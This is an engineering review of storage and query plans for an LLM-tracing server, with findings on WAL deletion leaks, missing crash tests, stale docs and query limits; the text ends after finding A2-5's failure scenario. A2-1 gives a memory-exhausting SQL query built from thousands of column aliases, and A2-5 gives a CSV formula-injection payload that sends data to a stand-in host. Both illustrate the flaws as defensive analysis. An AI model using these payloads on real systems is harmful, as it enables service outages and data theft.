# Full plan review

Date: 2026-11-15. Scope: every plan in `docs/plans/` on `main`, plus plan updates still on branches (PR #92 `claude/p-xtrack-fixes` for P; `claude/i-m3-m4-plans`, `claude/m8-align-i-m3` and `claude/n-m2-backup-plan` where they differ from `main`), and track Q's plans in the private `cetra-control` repository (branch `claude/q-cross-track-fixes`, its PR #3). PRs #88 (N M2) and #89 (R design and M1) were already merged when the review ran. No R M2–M7 plan text had been pushed, so R covers only `00-design.md` and `01-m1-model.md`.

Method: 16 Opus reviewers on high reasoning effort, one per area. Each read its plans in full, checked them against the spec, `docs/mvp-decisions.md`, `docs/roadmap.md` and AGENTS.md, and for implemented plans checked what `main` actually delivered (not a line-by-line code review). Then 16 Opus verifiers, one per area, each tried to disprove every finding by reading the sources itself. Findings already covered by the cross-track review (`docs/reviews/cross-track.md`, X1–X38, PR #91) were excluded; a finding cites an X-id only when it adds something new.

## Summary

90 findings were reported. 2 were refuted and 3 were merged into a duplicate, which leaves **86**: 1 blocker, 21 major and 64 minor. 79 are CONFIRMED and 7 PLAUSIBLE.

### Top findings

1. **A2-1** (blocker): SQL results have no byte bound. Aliasing one heavy column thousands of times, or a cross join, multiplies the JSON or CSV body past any memory limit, outside the query pool. H exposes it to read-only keys and MCP (H-1, merged).
2. **A1-1**: deleted rows stay in clear in the newest WAL segment until it fills to 64 MiB (weeks at low traffic), while the deletion shows as Applied and spec 03 §7 promises "minutes".
3. **M-1**: judge traces and scores committed after a deletion's cut-off are never erased; M8's claim that B2 mitigates this is false.
4. **Q-2**: every self-hosted release build accepts `cloud-1` control-plane and org tokens; D-Q-21 and D-Q-24 understate the blast radius.
5. **Q-3**: restoring a cell on a new server never fences the old one, so two cells can write to one bucket.
6. **G-1**: OTLP/gRPC decodes and inflates up to 32 MiB per stream before authentication and outside the in-flight budget.
7. **K-3**: "Send test" and email channels relay mail to any address, with no rate limit or recipient check.
8. **DE-2**: a password reset revokes sessions but not personal access tokens.
9. **I-2**: a typo in one project's judge model (provider 404) marks the org's connection failing and pauses every rule on it, in a loop.
10. **Q-1**: Q's redirect and authorize URLs use the wrong OIDC provider id (the server names it `oidc:cloud`), so cloud login fails.

Other majors: B-1 (built-in prices miss Gemini, Azure, xAI, Mistral), C-1 (the SSE client reconnects forever on any HTTP error, including 401), C-2 (live mode's page-1 refetch cancels itself), DE-1 (D's P26 security review never happened), DE-3 (E20's open decisions never taken), I-1 (M4 forbids an edit M3 makes necessary), K-1 (late scores fall out of score alerts), N-1 (control-socket auth refuses `kubectl exec` on the Helm chart), N-2 (PLAUSIBLE: `gc-orphans --dry-run` can delete live S3 objects), N-4 (`admin migrate` is under-specified and can run under a live server), P-1 (the "one QueryOptions constructor" test is bypassed by `Default`), Q-4 (the restore drill copies customer data to an operator's machine).

### Counts by severity

| Severity | Confirmed | Plausible | Total |
|---|---|---|---|
| blocker | 1 | 0 | 1 |
| major | 20 | 1 | 21 |
| minor | 58 | 6 | 64 |
| **all** | 79 | 7 | 86 |



## Findings by track

Within a track, findings are ordered by severity. "Verdict" is the verifier's: CONFIRMED was checked against the sources; PLAUSIBLE is credible but not fully proven. The severity is the verifier's, which sometimes lowered the reviewer's.

### Track A1 — storage

#### A1-1 — Deleted rows stay in the newest WAL segment, which can last weeks at low traffic; spec 03 §7 says the WAL clears in minutes

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** A1 (storage; fix via coordinator or R, since A1 is closed)
- **References:**
  - docs/spec/03-storage.md:416 (§7 Guarantee: 'The WAL holds data only until the next flush checkpoint (minutes), so it ages out by itself')
  - docs/spec/03-storage.md:82 and docs/mvp-decisions.md:173 (D120: the newest segment is never deleted; extra data up to wal.segment_bytes)
  - crates/storage/src/wal/mod.rs:103-120 (truncate_segments never deletes the last segment)
  - crates/storage/src/wal/writer.rs:330 (rotation is by size only: needs_rotation)
  - docs/plans/a1-storage/09-m5a-deletion.md § M5.4 step 8 (the 'applied' rule checks files and memtable batches, not WAL segments)
  - docs/plans/a1-storage/10-m5b-retention-media-drop.md § M5.7 (drop_project has the same gap)

**Problem.** A WAL segment rotates only when it reaches wal.segment_bytes (64 MiB by default), or at the next open. Truncation never deletes the newest segment (D120). A deletion counts as 'applied' once no file and no memtable batch holds covered rows. The WAL is not part of that check. So the raw Arrow IPC records (prompts, completions, user_id) of a deleted trace or user stay on disk in wal/spans/<newest>.wal. They stay until that segment fills to 64 MiB, or until a restart and the flush after it. Spec 03 §7 promises the opposite ('ages out by itself', 'minutes'), and §1/D120 say the leftover is bounded by size only, not by time. A dropped project's rows stay the same way.

**Failure scenario.** A small self-hosted instance ingests about 2 MB of spans a day. A user asks for GDPR erasure. register_deletion runs, the flush drops the rows, the deletion pass rewrites the files and deletion_status turns Applied, so the M UI shows the data as erased. wal/spans/0000…N.wal still holds the user's prompts in clear Arrow IPC for about 30 days (64 MiB at 2 MB/day), or until the process restarts. A disk snapshot or a cold backup taken in that window ships the deleted content.

**Suggested fix.** Make the newest segment age out by time. Recommended: after a flush whose max_seq equals the writer's last written seq (memtable drained), the flush asks the writer to rotate. The writer starts a new segment between groups. truncate_segments then deletes the old one at once, and so on every flush. Also add a 'no WAL segment holds a record with seq ≤ the seq at registration' condition to the deletion 'applied' check, and to finish_drop. Alternatively rotate on a wal.max_age. Add a test: at low traffic, append, register a deletion, flush, apply_deletions until Applied, then assert that no file under wal/spans contains the covered span's marker bytes. Same test for drop_project. Then reword spec 03 §7 Guarantee, and §1/D120, to the new bound.

**Verifier evidence.** docs/spec/03-storage.md:416 says 'The WAL holds data only until the next flush checkpoint (minutes), so it ages out by itself', while :82 (D120) keeps the newest segment and bounds the leftover by wal.segment_bytes only. crates/storage/src/wal/mod.rs truncate_segments returns early with <2 segments and never removes the last one. Rotation happens only through SegmentWriter::needs_rotation (segment.rs:121, len >= segment_bytes; writer.rs:330), and nothing in crates/storage rotates by age or after a flush. The deletion applied rule (spec 03 §7 around :410) checks files and memtable batches only. Related to X26 (the same Guarantee paragraph is wrong about gc.grace), but this is a separate leak path through the WAL, so not a duplicate.

#### A1-2 — 00-design.md, the design A1 tells implementers to follow, is stale in its status, public API, milestones and open questions

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** A1 (docs)
- **References:**
  - docs/plans/a1-storage/00-design.md:5 ('Nothing is implemented yet')
  - docs/plans/a1-storage/00-design.md:69 ('no other public items are added without updating this section') vs 87 ('pub fn query(...)': it is async since M6.1, crates/storage/src/lib.rs:569, and returns QueryError::Busy)
  - docs/plans/a1-storage/00-design.md:105-108 (shutdown: 'The value stays usable for a query of what was just flushed') vs crates/storage/src/lib.rs:894-905 ('A query must not run after this returns')
  - docs/plans/a1-storage/00-design.md:130-138 (ProjectQuery lacks `suspects`, crates/storage/src/views/mod.rs:58-59; read_cache_stats is missing, lib.rs:771)
  - docs/plans/a1-storage/00-design.md:444-453 (milestone table has no M6c / D-A1-13 row)
  - docs/plans/a1-storage/00-design.md:504-506 ('Still open: the exact start_time histogram … (M4)', answered by M4.4's exact quantiles)

**Problem.** The design says its § Public API lists every public item and must be updated when one is added. M6.1 made query async and added Busy. M6.4 added ProjectQuery.suspects. M6.5 added read_cache_stats. M6.1 also reversed the shutdown contract: no query may run after shutdown. None of this reached the design. The status line still says nothing is implemented, M6c is missing from the milestone table, and an M4 question is still listed as open.

**Failure scenario.** Track R (whose M1 models 'every read') or another track writes code or a model from 00-design § Public API. It calls query synchronously, or runs queries on a Storage after shutdown as the design allows. The second case lets the next open empty <data_dir>/tmp/query under a running query's spill files.

**Suggested fix.** Update 00-design: set the status to implemented (M1–M6c); make query async with QueryError::Busy; add ProjectQuery.suspects and read_cache_stats to the API block; take the shutdown sentence from lib.rs; add an M6c row (D-A1-13) to the milestones; move the slicing question to 'Answered in M4' (exact quantiles from time_values).

**Verifier evidence.** 00-design.md:5 says 'Nothing is implemented yet'. Line :69 says no public items are added without updating § Public API. Line :87 has a synchronous `pub fn query(...)`, while lib.rs:569 has `pub async fn query`. Line :105 says 'The value stays usable for a query of what was just flushed', while lib.rs:898-899 says 'A query must not run after this returns'. The ProjectQuery block (:130-138) has no suspects field, and read_cache_stats (lib.rs:772) is missing from the API. The milestone table (:444-453) stops at M6 with no M6c row. :506 still lists the start_time histogram question as open. X32 covers stale specs and plain decisions, not this plan design, so this is not a duplicate. A synchronous call would fail to compile, so the realistic risk is the shutdown-contract case.

#### A1-3 — S1/S1b results were never merged and the 5M M3 benchmark is still 'pending', yet the decisions and spec cite them and A1 is marked Done

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** Coordinator (A1 docs)
- **References:**
  - docs/research/storage/traces-benchmark.md:3-6 ('The S1/S1b spike results are recorded in this file on the docs/s1-trace-bench-results branch (… never merged) … the coordinating session combines the two')
  - docs/research/storage/traces-benchmark.md:59-64 ('The 5,000,000-trace target run is pending … no target is claimed as met or missed')
  - branch docs/s1-trace-bench-results (commit da446d8) is not an ancestor of main
  - docs/plans/a1-storage/00-design.md:289, 446, 449 (the S1 outcome and the M3 exit criterion 'The S1 latency targets hold on the real implementation')
  - docs/plans/a1-storage/05-m3a-traces-write.md § Prerequisites ('traces-benchmark.md exists on main … the user merges')
  - docs/mvp-decisions.md:139 (D86 cites '4 MB in 51 ms on 5M traces' in traces-benchmark.md)
  - docs/spec/03-storage.md:295 (cites traces-benchmark.md for the GROUP BY cost)
  - docs/roadmap.md:33 (A1 'Done')
  - docs/research/storage/benchmarks.md § Runs (M6.6 ran trace_bench at 1,000,000 traces only)

**Problem.** The evidence behind D86, D152 and D153 (the S1b numbers: anchor rebuild at 51 ms / 4 MB, a 13.7 s / 11 GiB SQL merge, the window-limit counts) exists only on an unmerged branch. On main, traces-benchmark.md holds only a reduced debug-build validation run and says the 5M-trace M3 exit run is pending. Later work (M6.6 and M6.9 at 1M traces) replaced the 5M check without saying so anywhere: nothing records that the M3 exit criterion was narrowed. The roadmap still marks A1 Done. Readers following the citations in D86 and spec 03 find no supporting data.

**Verifier correction.** The research file that D86 and spec 03 cite does not contain the S1/S1b data. The headline numbers survive only as summaries in 00-design.md (§ Trace-list spike). The 5M M3 exit run is still marked pending, and nothing records that it was replaced by the 1M runs.

**Failure scenario.** A reviewer or track R checks why the anchor (D86) and the custom merge (D152) were kept. They open docs/research/storage/traces-benchmark.md on main as D86 and spec 03 §6 direct, and find neither the 51 ms / 4 MB rebuild nor the GROUP BY numbers. Separately, nobody ever runs the 5M check, because A1 is marked Done and the 'pending' note sits only in a research file.

**Suggested fix.** Merge the S1b section from docs/s1-trace-bench-results:docs/research/storage/traces-benchmark.md into main's file, as AGENTS.md asks for research that backs decisions. Delete the 'coordinating session combines' and 'pending' wording. Then pick one: run the 5M --release trace_bench and record it, or record in traces-benchmark.md and in the roadmap A1 row that the M3 targets were checked at 1M traces (benchmarks.md Runs 3 and 7) and that the 5M run moved to R's M7 (5M traces).

**Verifier evidence.** docs/research/storage/traces-benchmark.md:3-7 says the S1/S1b results are on docs/s1-trace-bench-results, 'never merged', and 'the coordinating session combines the two'. Lines 59-64 say 'The 5,000,000-trace target run is pending'. `git merge-base --is-ancestor da446d8 HEAD` reports not an ancestor. D86 (mvp-decisions.md:139) cites this file for '4 MB in 51 ms on 5M traces'. benchmarks.md Runs 3-7 used 1,000,000 traces. The roadmap A1 row says Done. One part of the claim is overstated: the S1b headline numbers (51 ms / 4 MB, 13.7 s / 11 GiB) are summarised on main in docs/plans/a1-storage/00-design.md:273, 292 and 296, and in 04-s1b-trace-list-rerun.md:94. What is missing on main is the raw data in the cited research file, plus any record that the 5M M3 exit run was narrowed or dropped. Only documents are affected, so the severity drops to minor.

#### A1-4 — Two promised storage tests are missing: a retention crash test and a durability-order test for compaction

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** A1 (or R M1/M2)
- **References:**
  - docs/plans/a1-storage/10-m5b-retention-media-drop.md:16 (M5 exit criterion: 'crash tests cover deletion, retention, media and project drop (M5.8)'); § M5.8 defines only deletion, media and drop children
  - crates/storage/src/crash_tests.rs:32-77 (crash point lists: FLUSH, COMPACTION, DELETION, MEDIA, DROP; no retention)
  - docs/plans/a1-storage/00-design.md:436 ('A test-only recorder … asserts the order of § Durability items 2–4 for flush and compaction')
  - crates/storage/src/crash_tests.rs:978 (a_flush_syncs_the_file_before_the_catalog_commit is the only Storage-level use of hooks().points(); objects.rs:1063 and 1213 test single-object order only)
  - AGENTS.md § Tests ('Storage needs crash-recovery and concurrency tests')

**Problem.** M5's exit criterion lists retention among the crash-tested operations, but M5.8 defines no retention child and none exists. The retention tests (src/retention.rs) run in one process and never reopen with WAL-replayed rows of dropped days. The design promises a durability-order check (fsync, rename and dir-fsync of every output before the catalog commit; no object delete before the commit) for compaction as well as flush. Only flush has it. Compaction's order (spans output publish_output, then traces put_durable, then CatalogCommit) is covered only indirectly, by crash points that each abort at one hook.

**Failure scenario.** A change puts the traces put_durable after the commit, or lets GC run before it. Every abort-point test still passes, because each run aborts at a single hook. Nothing asserts the order, so a power loss can leave an active traces file with no object. Separately: a crash right after the retention commit, with rows of the dropped days still in the WAL, replays them on reopen. If a regression made flush ignore the watermark after a restart, files for dropped days would be recreated, and no test reopens to see it.

**Suggested fix.** Add retention_child / every_retention_hook_aborts_safely (point CatalogCommit). The child appends spans of D−2 without flushing, then aborts in apply_retention's commit. The parent reopens and checks two things: either no watermark and the old files are active, or the watermark is stored, no active file of D−2 exists, and after a flush no D−2 file appears. Add it to the justfile test recipe. Add a compaction recorder test like crash_tests.rs:978, with upload order fixed, asserting ObjectSync→ObjectRename→ObjectDirSync (spans output), then ObjectWrite…ObjectDirSync (traces output), then CatalogCommit, and no GcObsolete* point before CatalogCommit.

**Verifier evidence.** 10-m5b-retention-media-drop.md:16 lists 'crash tests cover deletion, retention, media and project drop (M5.8)'. crates/storage/src/crash_tests.rs:32-77 defines POINTS, COMPACTION_POINTS, DELETION_POINTS, MEDIA_POINTS and DROP_POINTS, and the file contains no 'retention' at all. retention.rs reopens Storage in single-process tests but has no abort or crash child. 00-design.md:436 promises an order recorder 'for flush and compaction'. The only uses of .points() are crash_tests.rs:992 (the flush test) and objects.rs:1063 and :1213 (single-object order), so compaction has no order test.

#### A1-5 — Staged-object GC logs media paths (which contain the blob's SHA-256), breaking M5.6's rule

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** A1
- **References:**
  - docs/plans/a1-storage/10-m5b-retention-media-drop.md § M5.6 Types ('MediaError::Object displays an object path, which holds the blob's hash, so media code never logs %error')
  - crates/storage/src/gc.rs:155 (tracing::debug!(path, "deleted staged object"), which also runs for media/<project>/<sha256> staged rows since M5.6)
  - crates/storage/src/gc.rs:95, 108 and crates/storage/src/lib.rs:463, 476 (debug!(%error, …) of GcError::Object, whose Display is '{action} {path}: {source}')
  - crates/storage/src/error.rs:415 (ObjectError::Io display includes the path)

**Problem.** Since M5.6, staged-object GC also collects media blobs: interrupted puts, collect_media's created_at=0 rows, and a put to a dropped project. M5.6 treats a media object path as sensitive because it holds the content's SHA-256. Media code obeys this with error.label(), but gc.rs and open_inner still log the raw path and %error at debug level. The comments there say only that keys contain project ids.

**Failure scenario.** An operator turns on debug logging (CETRA_LOG=debug) to diagnose GC. After a crash during put_media, or after a media collection, the log gets 'deleted staged object path=media/<project>/<sha256>'. Logs are shipped to a third-party aggregator. The hash identifies the exact image or document the user sent: a known file can be matched against it. That is the case the M5.6 rule exists to prevent.

**Suggested fix.** In gc.rs and lib.rs, redact paths under media/: log only 'media' plus the project id, and log GcError through a static label, not %error, as MediaError::label() does. Add a comment that staged rows include media paths.

**Verifier evidence.** gc.rs collect_once logs `tracing::debug!(path, "deleted staged object")` for every staged path (around :155). Media puts leave staged rows, and staged GC collects them: media.rs:540-563 shows a media path in staged_paths() removed by collect_staged. gc.rs (~:95, :108) and lib.rs (~:463, :476) log `debug!(%error, ...)`, with comments that mention only project ids. media.rs:93-94 and :150-154 log only error.label(), because 'the error names an object path, which holds the blob's hash', as 10-m5b § M5.6 (:224) requires. These logs are at debug level only, so minor is the right severity.

### Track A2 — query

#### A2-1 — SQL console results have no byte bound; aliasing one heavy column or cross-joining multiplies the encoded output past any memory limit

- **Severity:** blocker · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** A2
- **References:**
  - crates/storage/src/sql/run.rs:105-134 (execute: collect up to limit+1 rows, then json_rows)
  - crates/storage/src/sql/encode.rs:38-66 (json_rows encodes every batch into one Vec<u8>, then serde_json::from_slice into Values)
  - crates/storage/src/sql/encode.rs:131-153 (csv_rows goes through json_rows for each 8,192-row batch)
  - crates/server/src/routes/sql.rs:199-257 (JSON /sql has no role check; viewers and read-scoped keys can run it)
  - docs/mvp-decisions.md D-A2-2 ('Literal broadcast and join row duplication stay outside the pool, bounded by the 64 KiB statement and the 8,192-row batch')
  - docs/mvp-decisions.md D98; docs/spec/05-query.md § Sandbox item 8
  - docs/plans/h-console/README.md:68 (calls it a 'Known limit, inherited from A2 (D98)')
  - docs/reviews/a2-query.md § Open questions 2 (never answered)
  - docs/spec/02-ingestion.md § Limits (a single attribute value, including input/output, can be up to 8 MiB)
  - docs/plans/h-console/README.md:68 ('JSON answers have no byte cap beyond the 10,000 rows ... Known limit, inherited from A2 (D98)')
  - docs/reviews/a2-query.md:186 (Open question 2, never answered)
  - docs/mvp-decisions.md:151 D98 and :372 D-H-8 (no byte cap, no accepted-risk note)
  - docs/spec/05-query.md § Sandbox item 8
  - docs/spec/02-ingestion.md:238 (input/output up to ingest.max_attribute_bytes = 8 MiB each)
  - crates/storage/src/sql/run.rs sql_json (~lines 89-127: collect(stream) then cap_rows, nothing reserved in the query pool)
  - docs/plans/h-console/07-mcp-sql-tools.md § run_query steps 1-2 (cut_cells runs after the whole JSON is built)

**Problem.** The only output bound on sql_json is 10,000 rows. Exports encode whole 8,192-row batches. None of this goes through the query memory pool, and the D-A2-2 guard does not see it because no scalar function is called.

DataFusion projects a column under several aliases without copying it (one Arc'd array per alias), so the pool stays near zero. The arrow-json writer then writes every cell, json_rows copies the whole buffer again into serde_json Values, and the server serialises it a third time. A cross join likewise duplicates heavy strings through `take`, outside the pool.

The row cap therefore does not bound bytes. The amplification is the number of aliased columns, about 4,000 within 64 KiB, times the payload size. D-A2-2 says this duplication is 'bounded by the 64 KiB statement and the 8,192-row batch', but it ignores this per-column fan-out. H's README treats the gap as a known limit, yet no decision or spec records it, and the review's open question 2 was never answered.

**Merged.** Also reported by the H reviewer as H-1: H exposes the same unbounded body to viewers, read-only PATs, `sk` read keys and MCP `query_sql`, and records it only as a "known limit" in the h-console README.

**Failure scenario.** A project viewer, or MCP query_sql with its 1,000-row cap, sends `SELECT input AS c1, input AS c2, …, input AS c4000 FROM spans LIMIT 10000`. The text stays under 64 KiB and has 0 operator tokens. With 10 KiB prompts, the encoder writes 10,000 × 4,000 × 10 KiB ≈ 400 GB into one Vec<u8> and then parses it into serde_json, so the single cetra process is OOM-killed. `SELECT a.input FROM spans a CROSS JOIN spans b LIMIT 10000` does the same with 8 MiB payloads (80 GB). A CSV/NDJSON export by a member does it per batch (8,192 rows × fan-out). This is the same impact as the earlier blocker B-2: one authenticated user takes the server down.

**Suggested fix.** Bound encoding in A2. json_rows, csv_rows and ndjson_rows should write row by row (or in slices) and reserve the encoded bytes in the query memory pool through a MemoryConsumer, for example "sql result encoding", failing with RunError::TooLarge. sql_json should also have a hard byte cap, for example 64 MiB, that returns query_too_large (or truncated: true with a stated rule). Exports should encode in slices of rows so one chunk is bounded.

Record the cap in D98 and spec 05 § Sandbox item 8, correct D-A2-2's 'bounded by the 8,192-row batch' sentence, and drop the 'known limit' line in h-console/README.md.

Tests, under a bounded pool:
- the 4,000-alias query returns TooLarge;
- the cross-join query returns TooLarge;
- a normal 10,000-row query still succeeds;
- an export chunk never exceeds the budget.

**Verifier evidence.** crates/storage/src/sql/run.rs:105-134 collects up to limit+1 rows via `collect(stream)` and calls json_rows; encode.rs:38-66 writes every batch with arrow-json into one Vec<u8>, then serde_json::from_slice. No MemoryConsumer or byte cap appears anywhere. csv_rows (encode.rs:131-153) goes through json_rows per batch. Spec 05 § Sandbox item 8 and D98 bound rows only (10,000; exports 10M), and no byte cap exists. D-A2-2 (mvp-decisions.md:355) says literal broadcast and join duplication are 'bounded by the 64 KiB statement and the 8,192-row batch'. That ignores fan-out across many projected aliases of one heavy column: DataFusion's projection clones the ArrayRef for each Column alias, so the pool sees nothing, and unique_names only requires distinct aliases. h-console/README.md:68 openly calls JSON 'no byte cap beyond the 10,000 rows ... Known limit, inherited from A2 (D98)', but no decision or spec records accepting it. a2-query review open question 2 is unanswered. mvp-decisions D-H-8 row (line 368) confirms viewers and read-scoped keys reach POST /sql. I did not run a memory probe, but the code path has no bound, and even 100 aliases × 10,000 × 10 KiB is about 10 GB. The impact matches the earlier B-2 blocker.

#### A2-2 — P1's 512-term `~~` stack test was narrowed to the unoptimized plan, so the phases P1 says overflow are not covered

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** A2
- **References:**
  - docs/plans/a2-fixes/01-sql-statement-caps.md § Tests T5 (row `full_size_like_chains_run_on_a_two_megabyte_stack`, mode Run; Background: 'Planning and optimization are what overflow')
  - crates/storage/src/sql/mod.rs:373-382 (renamed `full_size_like_chains_plan_on_a_two_megabyte_stack`, OnStack::Logical, comment 'the stack risk is in `plan_sql`')
  - crates/storage/src/sql/mod.rs:60-82 (plan_tokens returns statement_to_plan output: no analyzer, optimizer or physical planning)

**Problem.** The plan asked for the full 512-term `~~` chain to be planned and run on a 2 MiB stack. The implementation found that the chain does not type-check past the first `~~`. Instead of choosing a valid chain or asserting the physical-planning error, it added an OnStack::Logical mode that stops after plan_sql.

plan_sql only converts SQL to an unoptimized logical plan. The type-coercion analyzer, the optimizer passes and create_physical_expr then recurse 512 levels deep on this chain in sql_json and sql_export, and P1's background names exactly those phases as the ones that overflow. The code comment claiming the risk is in plan_sql contradicts the plan, and the deviation is recorded neither in the phase report nor in the decisions.

**Failure scenario.** A later DataFusion bump, or a change to the guard or hex rules that walk expressions, makes the optimizer or physical planner overflow on a 512-deep `~~` chain. The 2 MiB test still passes because it never runs those phases, and in production a console query aborts the process. The same blind spot covers the PostgreSQL `~~*`, `!~~` and `!~~*` family that D-A2-1 added.

**Suggested fix.** Use OnStack::Plan and assert that create_physical_plan returns an error rather than aborting. Alternatively, build a chain that type-checks at every level and run it, for example `(… ~~ 'a') = true` repeated within the 512-operator budget. Delete the Logical mode if nothing else needs it, and correct the comment.

**Verifier evidence.** docs/plans/a2-fixes/01-sql-statement-caps.md:275 asks for `full_size_like_chains_run_on_a_two_megabyte_stack` with mode Run (line 279: 'the full chain is planned and run'), and line 44 says 'Planning and optimization are what overflow'. crates/storage/src/sql/mod.rs:373-382 renamed the test to `..._plan_...` and uses OnStack::Logical. mod.rs:308-310 returns right after plan_sql. plan_tokens (mod.rs:64-85) only calls statement_to_plan, so the analyzer, optimizer and physical planner never run on the 512-deep chain. The comment 'the stack risk is in `plan_sql`' contradicts the plan background. Line 282 says to stop and report rather than improvise; the plan was changed in place instead. Note that the existing OnStack::Plan mode `expect`s physical success, so the fix needs a mode that expects an error from create_physical_plan without aborting, or a type-correct chain.

#### A2-3 — Exact cost sums were extended to the dashboard and alerts without updating spec 05

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** A2
- **References:**
  - commit 7df11ea 'storage: sum metrics costs exactly' (touches reads/metrics.rs and mvp-decisions.md only)
  - crates/storage/src/reads/metrics.rs:495,741,882,939,1055 and crates/storage/src/reads/alerts.rs:154 (exact_cost_sum)
  - docs/spec/05-query.md § Logical views ('Cost totals of `sessions` and of the user list are summed as Decimal128(38, 18)') and § Dashboard metrics table ('cost | `sum(cost_total)`', 'evaluation cost | `sum(cost_total)`')
  - docs/mvp-decisions.md D-A2-4 (mentions the dashboard, not alerts)

**Problem.** AGENTS.md requires the spec to change in the same change as the code. 7df11ea switched every dashboard cost series and the cost KPI to Decimal128(38, 18) exact sums, but spec 05 still limits the rule to sessions and the user list, and its metrics table still shows plain `sum`.

The alert read (alert_value) also uses exact_cost_sum, and neither D-A2-4 nor spec 05 says so. That matters because D-A2-4's failure mode (a non-finite or over-1e20 cost fails the query with query_failed instead of being skipped) now also applies to the dashboard and to alert evaluation.

**Verifier correction.** Spec 05 § Dashboard metrics and § Logical views still describe plain sum for dashboard cost. Neither the spec nor D-A2-4 mentions that alert_value's cost measure (reads/alerts.rs:154, added by the alert-read commit 858b84f) also uses exact_cost_sum, and D-A2-4's failure-mode sentence names only session and user queries.

**Failure scenario.** Track R's model-based test (M1), or a weaker implementer, takes spec 05 at its word and models dashboard and alert cost as an f64 sum that skips non-finite values. It then reports a mismatch, or 'fixes' the code back to plain sum. Separately, an operator debugging a failing alert rule finds nothing in spec 05 or D-A2-4 explaining that a malformed span cost fails the alert query.

**Suggested fix.** In spec 05 § Dashboard metrics, say that cost series and KPIs (total, by model, top models, evaluation) and the alert cost value are summed as Decimal128(38, 18) (D-A2-4). Extend the § Logical views sentence accordingly, and append 'and alert values' to D-A2-4.

**Verifier evidence.** Spec 05 line 16 limits Decimal128 sums to sessions and the user list; lines 132 and 135 show plain `sum(cost_total)` for dashboard cost and evaluation cost. Commit 7df11ea changed reads/metrics.rs and mvp-decisions.md only, not the spec. D-A2-4 (mvp-decisions.md:357) mentions the dashboard cost KPI and series but not alerts. Its failure-mode sentence still says 'fails session and user queries', not dashboard or alerts. reads/alerts.rs:154 uses exact_cost_sum for AlertMeasure::Cost; it was added in 858b84f, which is likely the alerts track's work, so the alert part of the fix may belong to that track rather than A2.

#### A2-4 — A2 plan docs and the roadmap row were not updated after delivery: stale status lines, missing decision IDs, and a `RunError::Busy` that never exists

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** coordinator
- **References:**
  - docs/plans/a2-query/README.md:13 ('Nothing is implemented')
  - docs/plans/a2-fixes/README.md:12 ('Nothing is implemented')
  - docs/roadmap.md A2 row (Decisions column 'D91–D101' omits D-A2-1–D-A2-4)
  - docs/plans/a2-query/README.md:67 and :229, docs/plans/a2-query/03-sql-console.md:210 (A1 M6 adds `RunError::Busy` to A2's classifier)
  - crates/storage/src/query_error.rs (RunError has no Busy); crates/storage/src/error.rs:145-152 (QueryError::Busy returned by Storage::query); D-A1-8

**Problem.** Both A2 plan READMEs still say nothing is implemented, although Q1 to Q20 and P1 to P7 are merged. The roadmap's A2 row lists D91 to D101 only; the four track decisions D-A2-1 to D-A2-4 that P1, P2, P3, P5 and P7 added are missing, even though the a2-fixes README § After the plan assigns that row update to the coordinator.

The A2 README's Boundaries and Public API sections, and Q12, still say A1 M6 adds `Busy` to A2's RunError and classifier. M6.1 instead put admission refusal on QueryError::Busy at Storage::query, and the server maps it there (http/error.rs). A2's public API description is therefore wrong.

**Verifier correction.** Partly overlaps X32, which covers the roadmap A2 decision range. The new parts are the stale 'Nothing is implemented' status in both A2 READMEs and the wrong `RunError::Busy` description in the a2-query README and Q12.

**Failure scenario.** An implementer of a new read caller (I, M or R) follows the A2 README and matches `RunError::Busy`, which does not compile, or assumes a busy query can surface mid-execution through classify. Coordinators scanning the roadmap for A2's decisions miss D-A2-1 to D-A2-4.

**Suggested fix.** Set both READMEs' Status to Done, with commits/PRs. Replace the Busy sentences with: admission refusal is `QueryError::Busy` from `Storage::query` (D-A1-8); RunError has no Busy. Add D-A2-1–D-A2-4 to the roadmap A2 row.

**Verifier evidence.** docs/plans/a2-query/README.md:13 and docs/plans/a2-fixes/README.md:12 both say 'Nothing is implemented'. a2-query/README.md:67 and :229, plus 03-sql-console.md:210, say A1 M6 adds `RunError::Busy`. crates/storage/src/query_error.rs has no Busy; admission refusal is QueryError::Busy in crates/storage/src/error.rs:150-151, returned by Storage::query. The roadmap-row part (D-A2-1..4 missing from 'D91–D101') is already in cross-track X32 (cross-track.md line ~674). The status lines and the Busy API description are new.

#### A2-5 — CSV export writes attacker-influenced cells verbatim (formula injection); the review's open question was never decided

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** A2
- **References:**
  - crates/storage/src/sql/encode.rs:155-174 (csv_text and push_csv_field only quote; no neutralisation of leading = + - @ or tab/CR)
  - docs/reviews/a2-query.md § Open questions 4
  - docs/spec/05-query.md § Sandbox item 8; docs/mvp-decisions.md D98, D-H-8 (no mention)
  - docs/reviews/a2-query.md:188 (Open question 4: CSV formula injection, unanswered)
  - docs/plans/h-console/05-sql-export.md § 6 tests 2 and 11 (verbatim CSV pinned)
  - docs/plans/h-console/13-web-export-chart.md § 4 Export menu (UI download)
  - docs/plans/h-console/09-cli-query.md Step 4 § 9 (cetra query --format csv)
  - docs/mvp-decisions.md:372 D-H-8 (silent on it)

**Problem.** Span `name`, `input`, `output`, metadata values and user ids come from the instrumented application, and often from that application's own end users (their prompts). The CSV export writes them verbatim. A cell starting with `=`, `+`, `-`, `@`, tab or CR is evaluated as a formula when a team member opens the export in Excel, LibreOffice or Google Sheets. The A2 review raised this as open question 4, but no decision, spec text or backlog item records an answer, so the behaviour is neither fixed nor accepted on record.

**Merged.** Also reported by the H reviewer as H-2: H shipped CSV export without deciding A2's open question.

**Failure scenario.** An end user of a customer's chatbot types `=HYPERLINK("https://evil.example/?d="&A2,"click")` (or a DDE payload) as a prompt. It is stored as the span input. A project member exports `SELECT user_id, input FROM spans` to CSV and opens it in a spreadsheet. The formula runs and can leak neighbouring cells, such as other users' ids and prompts, to an outside host.

